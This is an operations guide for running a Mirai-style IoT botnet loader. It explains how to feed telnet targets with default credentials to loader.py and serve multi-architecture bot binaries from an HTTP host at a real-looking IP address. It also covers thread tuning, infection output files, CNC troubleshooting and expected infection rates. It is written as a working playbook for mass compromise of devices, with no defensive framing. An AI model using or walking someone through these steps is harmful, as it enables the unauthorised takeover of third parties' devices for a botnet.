# Loader.py Setup Guide

## Prerequisites

### 1. **Required Files**
- ✅ `loader.py` - Main loader script
- ✅ `bins/` directory with all architecture binaries
- ✅ Target list file (e.g., `telnet.txt`, `list.txt`)
- ✅ Python 2.7 (script uses Python 2 syntax)

### 2. **Binary Files Required**
Ensure these files exist in `/root/loader/bins/`:
```
static.x86      - x86 architecture
static.arm      - ARM architecture  
static.arm5     - ARM v5
static.arm6     - ARM v6
static.arm7     - ARM v7
static.mips     - MIPS architecture
static.mpsl     - MIPS Little Endian
static.ppc      - PowerPC
static.m68k     - Motorola 68000
static.spc      - SPARC
static.i686     - Intel 686
static.sh4      - SuperH-4
static.arc      - ARC
```

## Setup Steps

### 1. **Prepare Target List**
Create a target list file with format: `IP:PORT USER:PASS`
```bash
# Example telnet.txt:
192.168.1.1:23 admin:admin
10.0.0.1:23 root:12345
172.16.0.1:23 user:password
```

### 2. **Verify Binary Files**
```bash
cd /root/loader
ls -la bins/static.*
# Should show all architecture binaries
```

### 3. **Test HTTP Server**
```bash
# Test if binaries are accessible
curl -I http://185.247.117.214/bins/static.arm
# Should return 200 OK
```

### 4. **Run the Loader**
```bash
cd /root/loader
python loader.py telnet.txt
```

## Configuration Options

### **Thread Count**
- **Recommended**: 50-200 threads
- **High Performance**: 200-500 threads
- **Maximum**: 1000+ threads (system dependent)

### **Target List Format**
```
IP:PORT USER:PASS
192.168.1.1:23 admin:admin
10.0.0.1:23 root:12345
```

### **Output Files**
- `bots.txt` - All successful logins
- `infected.txt` - Successfully infected devices
- `echoes.txt` - Devices that received echo-loaded binaries

## Performance Optimization

### **1. System Limits**
```bash
# Increase file descriptor limits
ulimit -n 999999

# Increase network buffer sizes
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
sysctl -p
```

### **2. Network Optimization**
```bash
# Increase connection limits
echo 'net.core.somaxconn = 65535' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_max_syn_backlog = 65535' >> /etc/sysctl.conf
sysctl -p
```

### **3. Python Optimization**
```bash
# Install required packages
pip install psutil

# Set environment variables
export PYTHONUNBUFFERED=1
```

## Monitoring and Logs

### **Real-time Status**
The loader shows:
- **Logins**: Successful telnet logins
- **Ran**: Successfully infected devices
- **Echoes**: Echo-loaded devices
- **Wgets**: Devices using wget method
- **TFTPs**: Devices using TFTP method

### **Output Files**
```bash
# Monitor progress
tail -f bots.txt
tail -f infected.txt
tail -f echoes.txt
```

## Troubleshooting

### **Common Issues**

1. **"No such file or directory"**
   - Check if binaries exist in `bins/` directory
   - Verify file permissions

2. **Connection timeouts**
   - Reduce thread count
   - Check network connectivity
   - Verify target IPs are reachable

3. **Low infection rates**
   - Check if CNC server is running
   - Verify binary files are accessible via HTTP
   - Check target credentials

### **Debug Mode**
```bash
# Run with debug output
python -u loader.py telnet.txt
```

## Advanced Configuration

### **Custom Binary Paths**
Edit `rekdevice` variable in `loader.py` to change:
- Download URLs
- Binary names
- Execution commands

### **Custom Timeouts**
Modify timeout values in the script:
- Connection timeout: `tn.settimeout(0.5)`
- Read timeout: `timeout=8`
- Sleep intervals: `time.sleep()`

## Best Practices

1. **Start with small target lists** (100-1000 IPs)
2. **Monitor system resources** during scanning
3. **Use appropriate thread counts** for your system
4. **Keep logs** for analysis
5. **Test with known working targets** first

## Example Usage

```bash
# Basic usage
python loader.py telnet.txt

# With monitoring
python loader.py telnet.txt &
tail -f bots.txt infected.txt

# High performance
ulimit -n 999999
python loader.py telnet.txt
```

## Expected Results

- **Login Rate**: 10-30% of targets
- **Infection Rate**: 5-15% of successful logins
- **Echo Success**: 2-8% of infections
- **Total Success**: 0.1-2% of all targets
